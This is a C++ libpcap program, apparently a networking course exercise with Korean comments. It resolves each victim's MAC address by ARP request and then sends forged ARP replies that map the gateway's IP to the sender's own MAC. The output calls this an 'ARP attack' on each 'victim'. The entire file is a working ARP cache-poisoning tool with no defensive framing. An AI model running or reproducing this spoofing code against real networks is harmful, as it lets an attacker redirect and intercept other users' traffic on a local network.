#include <iostream>
#include <string>
#include <vector>
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>         
#include <iomanip>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

Ip myIpAddr;
Mac myMacAddr;

Mac getTargetMac(pcap_t* handle, const char* victim_ip) {
	struct pcap_pkthdr* header;
	const u_char* packet;
	int res;
	time_t start_time = time(nullptr); // 시작 시간 기록

	Ip victim_ip_obj(ntohl(inet_addr(victim_ip)));
	while ((res = pcap_next_ex(handle, &header, &packet)) >= 0) {
		if (res == 0) {
			if (difftime(time(nullptr), start_time) > 10) { // 10초 경과 확인
				cerr << "Timeout after 10 seconds while waiting for ARP reply." << endl;
				return Mac(); // 타임아웃 시 빈 MAC 주소 반환
			}
			continue; // 타임아웃 발생 시 루프 계속
		}
		EthArpPacket* arp_reply = (EthArpPacket*)packet;
		// 디버깅용 출력
		//cout << "\nA: \n" << arp_reply->arp_.sip() << endl;
		//cout << "\nB: \n" << victim_ip_obj << endl;
		// ARP 응답인지 확인하고, 올바른 IP에 대한 응답인지 확인
		if (arp_reply->eth_.type() == EthHdr::Arp && arp_reply->arp_.op() == ArpHdr::Reply && arp_reply->arp_.sip() == victim_ip_obj)
			return arp_reply->arp_.smac();// 응답 패킷에서 상대방의 MAC 주소 추출
	}
	cerr << "Failed to capture ARP reply for " << victim_ip << endl;
	return Mac(); // 실패 시 빈 MAC 주소 반환
}

void GetMyIPAndMAC(const char* device){
	pcap_if_t* alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	uint32_t res = pcap_findalldevs(&alldevs, errbuf);
	printf("Finding My IP and MAC address for device %s...\n", device);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, errbuf);
		exit(-1);
	}
	for (pcap_if_t* d = alldevs; d != NULL; d = d->next)
		if (strcmp(d->name, device) == 0)
			for (pcap_addr_t* a = d->addresses; a != NULL; a = a->next)
				if (a->addr->sa_family == AF_INET)
				{
					myIpAddr = Ip(ntohl(((struct sockaddr_in*)a->addr)->sin_addr.s_addr));
					struct ifreq s;
					struct sockaddr* sa;
					uint32_t fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
					strcpy(s.ifr_name, d->name);
					// Get MAC Address
					if (ioctl(fd, SIOCGIFHWADDR, &s) != 0)
					{
						printf("Failed to find MAC address.\n");
						pcap_freealldevs(alldevs);
						close(fd);
						exit(-1);
					}
					uint8_t tmpmac[6];
					for (uint32_t i = 0; i < 6; i++)
						tmpmac[i] = s.ifr_addr.sa_data[i];
					myMacAddr = Mac(tmpmac);
					close(fd);
					pcap_freealldevs(alldevs);
					return;
				}
	printf("Failed to find IP address.\n");
	pcap_freealldevs(alldevs);
	exit(-1);
}

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> <sender ip 2> <target ip 2> ...\n");
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 ...\n");
}

void printMacAddress(const Mac& mac) {
	const uint8_t* mac_bytes = static_cast<const uint8_t*>(mac);
	for (int i = 0; i < Mac::SIZE; ++i) {
		cout << hex << setw(2) << setfill('0') << static_cast<int>(mac_bytes[i]); //16진수 출력
		if (i < Mac::SIZE - 1)cout << ":";
	}
	cout << dec; //10진수로 돌려놓기
}

int main(int argc, char* argv[]) {
	if (argc <4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); // 타임아웃을 1000ms로 설정
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	vector<char *> victim_ip;
	vector<char *> gateway_ip;
	for (int i = 2; i < argc; i++) {
		if (i % 2 == 0) victim_ip.push_back(argv[i]);
		else gateway_ip.push_back(argv[i]);
	}
	if (victim_ip.size() != gateway_ip.size()) {
		usage();
		return -1;
	}
	cout << "Program start..." << endl << endl<<endl;
	GetMyIPAndMAC(dev);
	cout << "MAC Address of My IP (" << string(myIpAddr)<< ") is ";
	printMacAddress(myMacAddr); // MAC 주소 출력
	cout << endl;
	cout << endl;
	for (int i = 0; i < victim_ip.size(); i++) {
		printf("finding MAC address for victim[%d] (%s)...\n", i+1,victim_ip[i]);
		//cout << "\nC: \n" << myIpAddr << endl;
		EthArpPacket packet;
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.eth_.smac_ = myMacAddr;
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = myMacAddr;
		packet.arp_.sip_ = htonl(myIpAddr);
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.tip_ = htonl(Ip(victim_ip[i]));
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}
		// 응답 패킷 캡처 및 MAC 주소 추출
		Mac victim_mac = getTargetMac(handle, victim_ip[i]);
		if (victim_mac.isNull()) {
			cerr << "Failed to get MAC address for " << victim_ip[i] << endl;
			return -1;
		}
		else {
			cout << "MAC Address of victim["<<i+1<<"] IP (" << victim_ip[i] << ") is ";
			printMacAddress(victim_mac); // MAC 주소 출력
			cout << endl;
		}
		cout << "Starting ARP attack victim[" << i + 1 << "] IP (" << victim_ip[i] << ") MAC (";
		printMacAddress(victim_mac);
		cout<< ")..." << endl;
		EthArpPacket packetAttack;
		packetAttack.eth_.dmac_ = victim_mac;
		packetAttack.eth_.smac_ = myMacAddr;
		packetAttack.eth_.type_ = htons(EthHdr::Arp);
		packetAttack.arp_.hrd_ = htons(ArpHdr::ETHER);
		packetAttack.arp_.pro_ = htons(EthHdr::Ip4);
		packetAttack.arp_.hln_ = Mac::SIZE;
		packetAttack.arp_.pln_ = Ip::SIZE;
		packetAttack.arp_.op_ = htons(ArpHdr::Reply);
		packetAttack.arp_.smac_ = myMacAddr;
		packetAttack.arp_.sip_ = htonl(Ip(gateway_ip[i]));
		packetAttack.arp_.tmac_ = victim_mac;
		packetAttack.arp_.tip_ = htonl(Ip(victim_ip[i]));
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packetAttack), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return -1;
		}
		cout << endl;
	}
	cout << endl;
	cout << "All attacks end" << endl;
	cout << "Program exit..." << endl;
	pcap_close(handle);
}
